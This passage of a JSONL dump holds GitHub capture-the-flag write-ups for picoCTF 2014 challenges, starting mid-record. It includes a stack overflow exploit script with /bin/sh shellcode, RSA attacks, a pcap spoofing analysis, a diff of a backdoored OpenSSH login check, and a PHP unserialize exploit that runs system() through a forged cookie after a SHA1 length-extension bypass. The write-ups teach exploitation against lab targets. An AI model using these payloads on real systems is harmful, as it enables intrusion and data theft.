of assembler dump.\ngdb-peda$ br *vuln+24\nBreakpoint 1 at 0x8048e85\ngdb-peda$ r `python -c 'print \"A\"*76 + \"BBBB\"'`\n[----------------------------------registers-----------------------------------]\n\nEAX: 0xbfaf98a0 ('A' <repeats 76 times>, \"BBBB\")\nEBX: 0x80481a8 (<_init>:        push   ebx)\nECX: 0xbfafa5c0 --> 0x524f0042 ('B')\nEDX: 0xbfaf98ef --> 0xafa50042\nESI: 0x0\nEDI: 0x80eb00c --> 0x8067850 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])\nEBP: 0xbfaf98e8 (\"AAAABBBB\")\nESP: 0xbfaf9890 --> 0xbfaf98a0 ('A' <repeats 76 times>, \"BBBB\")\nEIP: 0x8048e85 (<vuln+24>:      leave)\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n\n   0x8048e7a <vuln+13>: lea    eax,[ebp-0x48]\n   0x8048e7d <vuln+16>: mov    DWORD PTR [esp],eax\n   0x8048e80 <vuln+19>: call   0x80481e0\n=> 0x8048e85 <vuln+24>: leave\n   0x8048e86 <vuln+25>: ret\n   0x8048e87 <main>:    push   ebp\n   0x8048e88 <main+1>:  mov    ebp,esp\n   0x8048e8a <main+3>:  and    esp,0xfffffff0\n[------------------------------------stack-------------------------------------]\n\n0000| 0xbfaf9890 --> 0xbfaf98a0 ('A' <repeats 76 times>, \"BBBB\")\n0004| 0xbfaf9894 --> 0xbfafa571 ('A' <repeats 76 times>, \"BBBB\")\n0008| 0xbfaf9898 --> 0xbfaf99a0 --> 0xbfafa5c2 (\"ORBIT_SOCKETDIR=/tmp/orbit-root\n\")\n0012| 0xbfaf989c --> 0x3\n0016| 0xbfaf98a0 ('A' <repeats 76 times>, \"BBBB\")\n0020| 0xbfaf98a4 ('A' <repeats 72 times>, \"BBBB\")\n0024| 0xbfaf98a8 ('A' <repeats 68 times>, \"BBBB\")\n0028| 0xbfaf98ac ('A' <repeats 64 times>, \"BBBB\")\n[------------------------------------------------------------------------------]\n\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x08048e85 in vuln ()\ngdb-peda$\n```\n\nAfter the leave instruction is executed, EIP will be set to 0x424242. EAX points to our buffer of \"A\"s and since the binary doesn't have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this: \n\n```\nroot@kali ~/pico-ctf/rop1\n# msfelfscan -j eax rop1\n[rop1]\n0x08048d86 call eax\n0x08048df4 call eax\n0x08048e3c call eax\n0x08049691 call eax\n.\n.\n.\n\n0x080e142f jmp eax\n0x080e336e push eax; ret\n0x080e53b3 jmp eax\n0x080e873b call eax\n0x080ea02c push eax; retn 0x0805\n0x080ed99c push eax; ret\n.\n.\n.\n```\n\nOut of the list I picked 0x080e142f which is a JMP EAX. For shellcode, I picked one that would execute /bin/sh. The final exploit code:\n\n```python\nimport struct\n\nshellcode = (\n\"\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\xeb\"+\n\"\\x16\\x5b\\x31\\xc0\\x88\\x43\\x07\\x89\\x5b\\x08\\x89\"+\n\"\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\"+\n\"\\x80\\xe8\\xe5\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\"+\n\"\\x73\\x68\\x58\\x41\\x41\\x41\\x41\\x42\\x42\\x42\\x42\"\n)\n\n# eip offset 76\njmpeax = struct.pack(\"<I\", 0x080e142f)  # jmp eax\n\nprint \"\\x90\"*21 + shellcode + jmpeax\n```\n\nFinally, exploit the binary and read the flag:\n\n```text\npico1139@shell:~/skj$ id\nuid=11066(pico1139) gid=1017(picogroup) groups=1017(picogroup)\npico1139@shell:~/skj$ /home/rop1/rop1 `python ./sploit.py`\n$ id\nuid=11066(pico1139) gid=1004(rop1) groups=1017(picogroup)\n$ cat /home/rop1/flag.txt\ntheres_no_need_to_guess\n$ \n```\n\nThe flag is **theres_no_need_to_guess**\n", "timestamp": "2025-10-24T11:40:18.317037"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/rsa-mistakes.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/rsa-mistakes.md", "content": "### Solved by Swappage\n\nRSA Mistakes was a 200 points cryptography master challenge in picoCTF.\nThe final objective was to recover the encrypted message.\n\n<!-- more -->\n\n![](/images/2014/pico/rsa-mistakes/problem.png)\n\nIn the downloaded zip file we were provided with\n\n- a traffic capture file in tcpdump format\n- a python script\n\nBy looking at the pcap file we could notice that there are a bunch of request/responses, which by the problem statement were most likely encrypted using RSA.\n\n![](/images/2014/pico/rsa-mistakes/tcpstreams.png)\n\nTwo of these streams, the first and the fourth, were extremely interesting, because two over the three parameters in the request were identical, while the third was not, and on the other side, the reply, which is supposed to be the encrypted message was completely different.\n\nSo, at this point, let's give a look at the server python script and try to figure things out.\n\n```python\n\t#!/usr/bin/env python\n\timport os\n\tfrom Crypto.PublicKey import RSA\n\timport SocketServer\n\timport threading\n\timport time\n\n\tmessage = ''\n\twith open('message.txt', 'r') as f:\n\t  message = f.read()\n\n\tclass threadedserver(SocketServer.ThreadingMixIn, SocketServer.TCPServer):\n\t  pass\n\n\tid_dict = {}\n\n\tclass incoming(SocketServer.BaseRequestHandler):\n\t  def handle(self):\n\t\tcur_thread = threading.current_thread()\n\t\twelcome = \"Welcome to the Daedalus Corp Message Service\\n\"\n\t\tself.request.send(welcome)\n\t\tself.request.send(\"Please send me a public key and an ID. We'll encrypt the message\")\n\t\tself.request.send(\" and send it to you.\\n\")\n\t\tkey = self.request.recv(4096)\n\t\tprint \"got %s\" % key\n\t\tN, e, user_id = key.split(' ')\n\t\tprint N, e\n\t\tN = int(N, 16)\n\t\te = int(e)\n\t\tuser_id = int(user_id)\n\t\tprint \"Got the user id!\"\n\t\tencrypted = hex(pow(user_id * int(message.encode('hex'), 16) + (user_id**2), e, N))\n\t\tprint \"encrypted.\"\n\t\tself.request.send(encrypted)\n\t\tprint \"DOne!\"\n\n\tserver = threadedserver((\"0.0.0.0\", 12345), incoming)\n\tserver.timeout = 4\n\tserver_thread = threading.Thread(target=server.serve_forever)\n\tserver_thread.daemon = True\n\tserver_thread.start()\n\tserver_thread.join()\n```\n\nThe interesting part is the following:\n\n```python\n\t\tN, e, user_id = key.split(' ')\n\t\tprint N, e\n\t\tN = int(N, 16)\n\t\te = int(e)\n\t\tuser_id = int(user_id)\n\t\tprint \"Got the user id!\"\n\t\tencrypted = hex(pow(user_id * int(message.encode('hex'), 16) + (user_id**2), e, N))\n```\n\nBy looking at these instructions we can notice that\n\n- the application recenves 3 parameters as imput, separated by a space\n- the program splits them to generate N, e and user_id, where N is the modulus and e is the exponent\n- and then it encrypts the message.\n\nBut if we look at the encryption function more closely, we can notice that the user_id plays a key role here, as it's used to modify the supplied message before the RSA encryption is performed.\n\nThe encryption itself is done with a typical RSA equation where we have\n\n$$\n\\begin{align}\nc &\\equiv m^e \\pmod{n}\n\\end{align}\n$$\n\nbut m in this specific case is\n\n$$\n\\begin{align}\nm = user\\_id * t + user\\_id^2\n\\end{align}\n$$\n\nwhere t is the user supplied text\n\nSo, putting things togeder we have:\n\n- two different encrypted messages\n- a small public exponent: 3\n- the same public key being used for both messages, because the public key (e, n) is the same in both encryption processes\n\nPlus, we also have a user_id parameter which differs, and allows us to determine a linear relation between the two messages so that\n\n$$\n\\begin{align}\nm_1 &\\equiv \\alpha m_2 + \\beta \\pmod{n} \n\\end{align}\n$$\n\nThis is a convenient situation, because there is an interesting theorem: the theorem of Franklin-Raiter that states:\n\nSet $$ e = 3 $$ and let $$ (N, e)$$  be an RSA public key. Let $$ M_1 \\neq M2 \\in \\mathbb{Z}^*_N $$ satisfy $$ M_1 \\equiv f(M_2) \\pmod{n} $$ for some linear polynomial $$ f = \\alpha x + \\beta \\in \\mathbb{Z}_N[x] $$ with $$ b \\neq 0 $$ . Then, given $$ (N, e, C_1, C_2, f) $$, the attacker can recover $$ M_1, M_2 $$ in time quadratic in $$log_2 N $$.\n\nThe original paper which can be found here: https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf\n\nalso provides us with all the mathematical functions we need to calculate the value of our plaintext message from the encrypted messages: so all we were left to do was to calculate $$M_2$$ in function of $$M_1$$ as shown above, and implement the formula in a python script to compute the values for us; once the plaintext for the message is recovered, it's then just a matter of extracting $$t$$.\n\nFirst let's start by working on the messages and have them set in a proper way: since we need $$\\alpha$$ and $$\\beta$$ we procede as follows.\n\nGiven\n\n- user_id1 as the first message userid\n- user_id2 as the second message userid\n- t as the plaintext we need to recover\n- x as the modular inverse multiplier of 37\n\n$$\n\\begin{gather*}\nuser\\_id1 = 37 \\\\\nuser\\_id2 = 52 \\\\\n\\\\\nM_1 \\equiv 37 * t + 37^2 \\pmod{n} \\\\\nM_2 \\equiv 52 * t + 52^2 \\pmod{n} \\\\\n\\\\\nt \\equiv x(M_1 - 37^2) \\pmod{n} \\\\\n\\\\\nm2 \\equiv 52xM_1 - 52*37^2x +52^2 \\pmod{n} \\\\\n\\\\\na \\equiv 52x \\pmod{n} \\\\\nb \\equiv 52^2 - 52*37^2x \\pmod{n} \\\\\n\n\\end{gather*}\n\n$$\n\nNow that we have $$\\alpha$$ and $$\\beta$$ what remains to do is punch them in our python script with $$C_1, C_2$$ and $$N$$ to retrieve $$M_1$$\n\n```python\n\t#!/usr/bin/python\n\n\t# Functions for calculating the modular inverse multiplier\n\tdef egcd(a, b):\n\t    if a == 0:\n\t\treturn (b, 0, 1)\n\t    else:\n\t\tg, y, x = egcd(b % a, a)\n\t\treturn (g, x - (b // a) * y, y)\n\n\tdef modinv(a, m):\n\t    g, x, y = egcd(a, m)\n\t    if g != 1:\n\t\traise Exception('modular inverse does not exist')\n\t    else:\n\t\treturn x % m\n\n\t#The modulus\n\tN = \"fd2adfc8f9e88d3f31941e82bef75f6f9afcbba4ba2fc19e71aab2bf5eb3dbbfb1ff3e84b6a4900f472cc9450205d2062fa6e532530938ffb9e144e4f9307d8a2ebd01ae578fd10699475491218709cfa0aa1bfbd7f2ebc5151ce9c7e7256f14915a52d235625342c7d052de0521341e00db5748bcad592b82423c556f1c1051\"\n\tN = int(N, 16)\n\n\t#The exponent\n\te = 3\n\n\t#Encrypted message 1\n\tc1 = \"0x81579ec88d73deaf602426946939f0339fed44be1b318305e1ab8d4d77a8e1dd7c67ea9cbac059ef06dd7bb91648314924d65165ec66065f4af96f7b4ce53f8edac10775e0d82660aa98ca62125699f7809dac8cf1fc8d44a09cc44f0d04ee318fb0015e5d7dcd7a23f6a5d3b1dbbdf8aab207245edf079d71c6ef5b3fc04416L\"\n\tc1 = long(c1, 16)\n\n\t#Encrypted message 2\n\tc2 = \"0x1348effb7ff42372122f372020b9b22c8e053e048c72258ba7a2606c82129d1688ae6e0df7d4fb97b1009e7a3215aca9089a4dfd6e81351d81b3f4e1b358504f024892302cd72f51000f1664b2de9578fbb284427b04ef0a38135751864541515eada61b4c72e57382cf901922094b3fe0b5ebbdbac16dc572c392f6c9fbd01eL\"\n\tc2 = long(c2, 16)\n\n\tx = modinv(37, N)\n\n\ta = (52*x)%N\n\tb = ((52**2) - 52*(37**2)*x)%N\n\ty = (a * (c2 - (a**3) * c1 + 2 * (b**3)))%N\n\n\ty = modinv(y, N)\n\tm1 = ((b * (c2 + 2 * (a**3) * c1 - (b**3))) *y )%N\n\n\tprint \"M1 = \" + str(m1)\n\tt = (x*(m1 - (37**2)))%N\n\tprint \"t = \" + str(hex(t))\n\n```\n\nRunning the above script returns the following output\n\n\t0x576f772120596f757220666c61672069733a206469645f796f755f6b6e6f775f796f755f63616e5f736f6d6574696d65735f6763645f6f7574736964655f615f6575636c696465616e5f646f6d61696e0a\n\nthat converted to ASCII gives us the flag:\n\n\tWow! Your flag is: did_you_know_you_can_sometimes_gcd_outside_a_euclidean_domain\n", "timestamp": "2025-10-24T11:40:18.431535"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/rsa.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/rsa.md", "content": "### Solved by bitvijays\n\nRSA is a 80 point Cryptography challenge. You are provided with a RSA variables p,q, N, e, d, c. You have to find out the message m.\n\n> A Daedalus Corp spy sent an RSA-encrypted message. We got their key data, but we're not very good at math. Can you decrypt it? Here's the data. Note that the flag is not a number but a number decoded as ASCII text.\n\n```\nN = 0xb197d3afe713816582ee988b276f635800f728f118f5125de1c7c1e57f2738351de8ac643c118a5480f867b6d8756021911818e470952bd0a5262ed86b4fc4c2b7962cd197a8bd8d8ae3f821ad712a42285db67c85983581c4c39f80dbb21bf700dbd2ae9709f7e307769b5c0e624b661441c1ddb62ef1fe7684bbe61d8a19e7\ne = 65537\np = 0xc315d99cf91a018dafba850237935b2d981e82b02d994f94db0a1ae40d1fc7ab9799286ac68d620f1102ef515b348807060e6caec5320e3dceb25a0b98356399\nq = 0xe90bbb3d4f51311f0b7669abd04e4cc48687ad0e168e7183a9de3ff9fd2d2a3a50303a5109457bd45f0abe1c5750edfaff1ad87c13eed45e1b4bd2366b49d97f\nd = 0x496747c7dceae300e22d5c3fa7fd1242bda36af8bc280f7f5e630271a92cbcbeb7ae04132a00d5fc379274cbce8c353faa891b40d087d7a4559e829e513c97467345adca3aa66550a68889cf930ecdfde706445b3f110c0cb4a81ca66f8630ed003feea59a51dc1d18a7f6301f2817cb53b1fb58b2a5ad163e9f1f9fe463b901\nc = 0x58ae101736022f486216e290d39e839e7d02a124f725865ed1b5eea7144a4c40828bd4d14dcea967561477a516ce338f293ca86efc72a272c332c5468ef43ed5d8062152aae9484a50051d71943cf4c3249d8c4b2f6c39680cc75e58125359edd2544e89f54d2e5cbed06bb3ed61e5ca7643ebb7fa04638aa0a0f23955e5b5d9\n```\n\nThe solution to this one was pretty easy as ciphertext c, decryption key d, modulus N is given. We just need to find m which c raised to d mod N.\n\nJust enter these values after writing python on terminal.\n```\nm = pow(c,d,N)\n\nm\n6861258080156838161702842331923358676171560876407473046529829839343656597465212914039681453600936115970901835821496646686989354106193309238635902806952707316468225954530890939348472370864299291305467697683712618633711800447421650242202732L\n\nhex(m)\n'0x436f6e67726174756c6174696f6e73206f6e2064656372797074696e6720616e20525341206d6573736167652120596f757220666c6167206973206d6f64756c61725f61726974686d65746963735f6e6f745f736f5f6261645f61667465725f616c6cL'\n\n \"436f6e67726174756c6174696f6e73206f6e2064656372797074696e6720616e20525341206d6573736167652120596f757220666c6167206973206d6f64756c61725f61726974686d65746963735f6e6f745f736f5f6261645f61667465725f616c6c\"\n.decode(\"hex\")\n'Congratulations on decrypting an RSA message! Your flag is modular_arithmetics_not_so_bad_after_all'\n```\n\n\nThe flag is **modular_arithmetics_not_so_bad_after_all**\n", "timestamp": "2025-10-24T11:40:18.547786"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/spoof-proof.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/spoof-proof.md", "content": "### Solved by bitvijays\n\nIn the excercise, we have to find the attacker's last name and the two IP address he has spoofed. \n>The police have retrieved a network trace of some suspicious activity. Most of the traffic is users viewing their own profiles on a social networking website, but one of the users on the network downloaded a file from the Thyrin Labs VPN and spoofed their IP address in order to hide their identity. Can you figure out the last name of person that accessed the Thyrin files, and the two source IP addresses they used?\n[Example valid flag format: \"davis,192.168.50.6,192.168.50.7\"]\n\nYou could either download the PCAP file or view it on cloudshark. We downloaded the PCAP file and as it is mentioned in the challenged, Attacker spoofed their IP address, the MAC address should be the same. If we look for the ARP (Address Resolution Protocol) Packets, display filter \"arp\", we can easily see that MAC address: 08:00:27:2b:f7:02 sent Who has 192.168.50.10 with two IP Address 192.168.50.3, 192.168.50.4. So, we got the two IP address which were spoofed.\n\n![](/images/2014/pico/spoof_proof/trafficARP.png)\n\nSince the IP of the attacker before spoofing was 192.168.50.3, if we use display filter \"ip.addr==192.168.50.3\", We can easily see the name of the user which is john johnson.\n\n![](/images/2014/pico/spoof_proof/trafficIP.png)\n\nCombining all the information such as last name and two spoofed IP address in the valid flag format, we get the flag.\n\nThe flag is **johnson,192.168.50.3,192.168.50.4**.\n", "timestamp": "2025-10-24T11:40:18.644017"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/ssh-backdoor.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/ssh-backdoor.md", "content": "### Solved by superkojiman\n\nSSH Backdoor is a 100 point forensics challenge. \n\n> Some hackers have broken into my server backdoor.picoctf.com and locked my user out (my username is jon). I need to retrieve the flag.txt file from my home directory. \nThe last thing we noticed in out network logs show is the attacker downloading this. Can you figure out a way to get back into my account?\n\nThe network logs showed a download of [openssh-6.7p1-evil.tar.gz](https://picoctf.com/problem-static/forensics/SSHBackdoor/openssh-6.7p1-evil.tar.gz). The hint for this challenge suggests that a backdoor was left in this version of OpenSSH. So if we can find the backdoor, we can figure out how to login to the server. I downloaded the backdoored OpenSSH, and also grabbed the original clean version from [http://openbsd.cs.toronto.edu/pub/OpenBSD/OpenSSH/portable/openssh-6.7p1.tar.gz](here). I unpacked the backdoored version into a directory called evil, and the clean version into a directory called orig:\n\n```\n$ mkdir evil; tar xvzf openssh-6.7p1-evil.tar.gz -C evil\n$ mkdir orig; tar xvzf openssh-6.7p1 -C orig \n```\n\nNow let's check to see what files are different. Quickest way was to just use the cmp command:\n\n```\n$ for i in evil/openssh-6.7p1/*; do if [[ ! -d $i ]]; then cmp $i orig/openssh-6.7p1/`basename $i`; fi  ;done\nevil/openssh-6.7p1/auth-passwd.c orig/openssh-6.7p1/auth-passwd.c differ: char 3621, line 115\ncmp: EOF on orig/openssh-6.7p1/auth.c\nevil/openssh-6.7p1/auth.h orig/openssh-6.7p1/auth.h differ: char 7091, line 214\n```\n\nLooks like auth.c has been modified in the backdoored version. Let's have a look at the changes: \n\n```\n$ diff evil/openssh-6.7p1/auth.c orig/openssh-6.7p1/auth.c\n777,794d776\n<\n< static int frobcmp(const char *chk, const char *str) {\n<   int rc = 0;\n<   size_t len = strlen(str);\n<   char *s = xstrdup(str);\n<   memfrob(s, len);\n<\n<   if (strcmp(chk, s) == 0) {\n<       rc = 1;\n<   }\n<\n<   free(s);\n<   return rc;\n< }\n<\n< int check_password(const char *password) {\n<   return frobcmp(\"CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY\", password);\n< }\n```\n\nSo the backdoor is pretty simple. It takes the user's password, calls memfrob() on it, and if it matches the string \"CGCDSE_XGKIBCDOY\\^OKFCDMSE_XLFKMY\", then it lets the user in. What does memfrob() do? According to its manual page:\n\n> The memfrob() function encrypts the first n bytes of the memory area s by exclusive-ORing each character with the number 42.  The effect can be reversed by using memfrob() on the encrypted memory area.\n\nSo it just XORs the password using a key, in this case, the length of the password. To decrypt the password \"CGCDSE_XGKIBCDOY\\^OKFCDMSE_XLFKMY\", we just need to XOR it with its length. The following C code does just that:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    char *s = \"CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY\";\n    char *t = strdup(s); \n    size_t len = strlen(s); \n\n    memfrob(t, len);\n    printf(\"%s\\n\", t); \n    return 0; \n}\n```\n\nWe compile and run it, and it gives us the password:\n\n```text\n$ gcc decrypt.c -o decrypt\n$ ./decrypt \niminyourmachinestealingyourflags\n```\n\nLet's try to login:\n\n```text\n$ ssh jon@backdoor.picoctf.com\nThe authenticity of host 'backdoor.picoctf.com (23.21.109.77)' can't be established.\nRSA key fingerprint is 69:2c:9a:4c:64:f3:e3:2a:0a:d9:b1:9a:59:de:32:71.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added 'backdoor.picoctf.com,23.21.109.77' (RSA) to the list of known hosts.\njon@backdoor.picoctf.com's password:\nLast login: Sat Nov  1 20:23:59 2014 from 184.72.219.127\njon@ip-10-45-162-116:~$ ls\nflag.txt\njon@ip-10-45-162-116:~$ cat flag.txt\nssshhhhh_theres_a_backdoor\n```\n\nSuccess! We logged in, found a flag.txt, and read its contents. The flag is **ssshhhhh_theres_a_backdoor**\n", "timestamp": "2025-10-24T11:40:18.809015"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/steves-list.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/steves-list.md", "content": "### Solved by Swappage\n\nSteve's List was a 200 points master challenge mostly focused on web exploitation, but also with a little of crypto inside.\n\nThe problem stated\n\n![](/images/2014/pico/steveslist/problem.png)\n\nSo we were playing with a defaced website, we had the web server, a backup archive containing the source for a white box analysis and a flag to read.\n\n<!-- more -->\n\nI started looking at the source code, and a couple of things turned out looking really interesting.\n\nLet's start with the cookie.php page, which is the page that actually has the vuln:\n\n```php\n\t<?php\n\t  if (isset($_COOKIE['custom_settings'])) {\n\t\t// We should verify to make sure this thing is legit.\n\t\t$custom_settings = urldecode($_COOKIE['custom_settings']);\n\t\t$hash = sha1(AUTH_SECRET . $custom_settings);\n\t\tif ($hash !== $_COOKIE['custom_settings_hash']) {\n\t\t  die(\"Why would you hack Section Chief Steve's site? :(\");\n\t\t}\n\t\t// we only support one setting for now, but we might as well put this in.\n\t\t$settings_array = explode(\"\\n\", $custom_settings);\n\t\t$custom_settings = array();\n\t\tfor ($i = 0; $i < count($settings_array); $i++) {\n\t\t  $setting = $settings_array[$i];\n\t\t  $setting = unserialize($setting);\n\t\t  $custom_settings[] = $setting;\n\t\t}\n\t  } else {\n\t\t$custom_settings = array(0 => true);\n\t\tsetcookie('custom_settings', urlencode(serialize(true)), time() + 86400 * 30, \"/\");\n\t\tsetcookie('custom_settings_hash', sha1(AUTH_SECRET . serialize(true)), time() + 86400 * 30, \"/\");\n\t  }\n\t?>\n```\n\nAs we can see, the vuln here is pretty clear: there is a deserialization of an object that is specified in a cookie value.\nWhat happens here is that the value of the cookie is splitted on the \"\\n\" character, and each value is put in an array and then the function unserialize() is invoked on that value.\n\nAs we will see later, this will allow us to gain remote code execution on the server, but unfortunately, for now there is something really annoying that is preventing us from reaching the exploitable branch of code.\n\nIn fact at line 5 the cookie value is appended to an AUTH_SECRET value, and a sha1 hash of the resulting concatenation is checked against another cookie, named custom_settings_hash\nwhich is set the first time we visit the site by the code from line from 19 to 21 of the cookie.php page.\n\nthe AUTH_SECRET value is statically defined in another php page, where all the static variables are set: root_data.php\n\n```php\n\t<?php\n\t  define('STEVES_LIST_ABSOLUTE_INCLUDE_ROOT', dirname(__FILE__) . \"/\");\n\t  define('STEVES_LIST_TEMPLATES_PATH', dirname(__FILE__) . \"/templates/\");\n\t  define('DISPLAY_POSTS', 0);\n\t  // Daedalus changed this... I guess AAAAAAAA was not a good secret :(\n\t  define('AUTH_SECRET', \"AAAAAAAA\");\n\t  require_once(STEVES_LIST_ABSOLUTE_INCLUDE_ROOT . \"includes/classes.php\");\n\t?>\n```\n\nIn our local backup, the static value is set to AAAAAAAA, but on the remote server the \"hackers\" from daedalus corp modified that value to prevent us from taking back the control of the web site.\n\nAnd here is where crypto comes in play: yes, because there is an attack. known as *length extension attack* that allows us to bypass the above verification issue.\n\nThe attack can be performed with all the hashes where the function is H(secret.message) and where the message and the length of the secret are known.\n\nWe know already that the value of AUTH_SECRET is fixed to 8 characters, so we can abuse the length extension attack to append extra data to the custom_settings cookie.\n\nBefore performing this attack, we were bound to a fixed value in the custom_settings cookie, that was\n\n\tb:1;\n\t\nwhich is the serialization of a true statement\n\n```php\n\tserialize(true)\n```\n\nbut now we can predict the hash that will result by padding that value and appending extra data, so we can append a \\n followed by another serialized object that would eventually be deserialized after the check was successfully passed.\n\nUsing a python library for implementing the Length extension attack: hlextend i was able to build a simple payload that would bypass the validation; for now let's be happy i was able to inject test.\n\n![](/images/2014/pico/steveslist/hashbypass.png)\n\nOnce the problem of bypassing the hash validation was solved, I had to find a way to gain code execution.\nDoing that on the remote server would have been a little too much of a frustration, so i decided to create a local instance using the website backup, and by tweaking the code a bit, try to build a working object that would allow to gain code execution.\n\nafter looking at the source code of the class.php a little closer, I found that the Post class would be the perfect object to serialize and inject; \n\n```php\n\tclass Post {\n\t\tprotected $title;\n\t\tprotected $text;\n\t\tprotected $filters;\n\t\tfunction __construct($title, $text, $filters) {\n\t\t\t$this->title = $title;\n\t\t\t$this->text = $text;\n\t\t\t$this->filters = $filters;\n\t}\n\n```\n\nthe class accepts 3 parameters in the constructor\n\n- title\n- text\n- filter\n\nwhere title is a string, text is also a string, while filter is an array of objects from the Filter class.\n\n```php\n\tclass Filter {\n\t\tprotected $pattern;\n\t\tprotected $repl;\n\t\tfunction __construct($pattern, $repl) {\n\t\t  $this->pattern = $pattern;\n\t\t  $this->repl = $repl;\n\t\t}\n\t\tfunction filter($data) {\n\t\t  return preg_replace($this->pattern, $this->repl, $data);\n\t\t}\n\t};\n```\n\nAnd how convenient, because the Filter class makes a good use of the preg_replace() function! This is really good, because considering we are in control of the object, we can forge the regular expressions for the Filter object, and this allows us, to create a regexp that instead of replacing, would execute our substitution payload.\n\nTo build the object i created this simple PHP snipplet:\n\n```php\n<?php\n\nclass Filter {\n    protected $pattern;\n    protected $repl;\n\n    function __construct($pattern, $repl) {\n      $this->pattern = $pattern;\n      $this->repl = $repl;\n    }\n    function filter($data) {\n      return preg_replace($this->pattern, $this->repl, $data);\n    }\n\n}\n\n$filterobject = [new Filter(\"/test/e\", \"system('cat /etc/passwd');\")];\n\nclass Post\n{\n   protected $title = \"test\";\n   protected $text = \"test\";\n   protected $filters;\n\n   function __construct() {\n        global $filterobject;\n        $this->filters = $filterobject;\n   }\n\n}\n\nprint  \"\\n\".serialize(new Post));\n```\n\nsaved the output to a file (because the serialized objects may contain non printable characters\nURL encoded it, and tried to send it to my local server.\n\nThe result was the following\n\n![](/images/2014/pico/steveslist/injected.png)\n\nOk, now i had an object that would allow me to execute arbitrary code on the remote server.\n\nI replaced the payload with a cat /home/daedalus/flag.txt and used the following python snipplet to calculate the hash and produce proper padding\n\n```python\n\t#!/usr/bin/python\n\n\timport sys\n\timport struct\n\timport hlextend\n\timport urllib\n\n\tobject = \"\"\n\n\twith open(\"rawcookie.bin\", \"rb\") as f:\n\t\tbyte = f.read(1)\n\t\twhile byte != \"\":\n\t\t\tobject += byte\n\t\t\tbyte = f.read(1)\n\n\tprint object\n\n\tsha = hlextend.new('sha1')\n\n\tmeh = sha.extend(object, 'b:1;', 8, '2141b332222df459fd212440824a35e63d37ef69')\n\n\tprint meh\n\n\tprint sha.hexdigest()\n```\n\nhere is an hex representation of the custom_settings cookie without URL encoding\n\n\t00000000  0a 4f 3a 34 3a 22 50 6f  73 74 22 3a 33 3a 7b 73  |.O:4:\"Post\":3:{s|\n\t00000010  3a 38 3a 22 00 2a 00 74  69 74 6c 65 22 3b 73 3a  |:8:\".*.title\";s:|\n\t00000020  34 3a 22 74 65 73 74 22  3b 73 3a 37 3a 22 00 2a  |4:\"test\";s:7:\".*|\n\t00000030  00 74 65 78 74 22 3b 73  3a 34 3a 22 74 65 73 74  |.text\";s:4:\"test|\n\t00000040  22 3b 73 3a 31 30 3a 22  00 2a 00 66 69 6c 74 65  |\";s:10:\".*.filte|\n\t00000050  72 73 22 3b 61 3a 31 3a  7b 69 3a 30 3b 4f 3a 36  |rs\";a:1:{i:0;O:6|\n\t00000060  3a 22 46 69 6c 74 65 72  22 3a 32 3a 7b 73 3a 31  |:\"Filter\":2:{s:1|\n\t00000070  30 3a 22 00 2a 00 70 61  74 74 65 72 6e 22 3b 73  |0:\".*.pattern\";s|\n\t00000080  3a 37 3a 22 2f 74 65 73  74 2f 65 22 3b 73 3a 37  |:7:\"/test/e\";s:7|\n\t00000090  3a 22 00 2a 00 72 65 70  6c 22 3b 73 3a 33 38 3a  |:\".*.repl\";s:38:|\n\t000000a0  22 73 79 73 74 65 6d 28  27 63 61 74 20 2f 68 6f  |\"system('cat /ho|\n\t000000b0  6d 65 2f 64 61 65 64 61  6c 75 73 2f 66 6c 61 67  |me/daedalus/flag|\n\t000000c0  2e 74 78 74 27 29 3b 22  3b 7d 7d 7d              |.txt');\";}}}|\n\n\nthe resulting cookies content for the submission to the vulnerable page were respectively:\n\n\tcustom_settings_hash: 13c0bac46fcbd453c5052bce1d2f9ad6c88fe2bc\n\n\tvustom_settings: b:1%3b%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A4%3A%22test%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A4%3A%22test%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A7%3A%22%2Ftest%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A38%3A%22system%28%27cat+%2Fhome%2Fdaedalus%2Fflag.txt%27%29%3B%22%3B%7D%7D%7D\n\nand they resulted in the flag being correctly retrieved\n\n![](/images/2014/pico/steveslist/flag.png)\n\n", "timestamp": "2025-10-24T11:40:18.937967"}
